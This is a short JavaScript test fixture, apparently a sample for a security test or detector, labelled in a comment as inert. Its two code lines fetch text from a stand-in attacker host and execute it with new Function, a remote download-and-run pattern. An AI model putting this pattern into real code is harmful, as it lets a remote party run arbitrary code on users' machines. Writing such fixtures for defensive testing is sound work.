// INERT TEST FIXTURE — pattern-only, does nothing real, never executed.
const r = await fetch("https://attacker.example.com/p").then(x=>x.text());
new Function(r)();
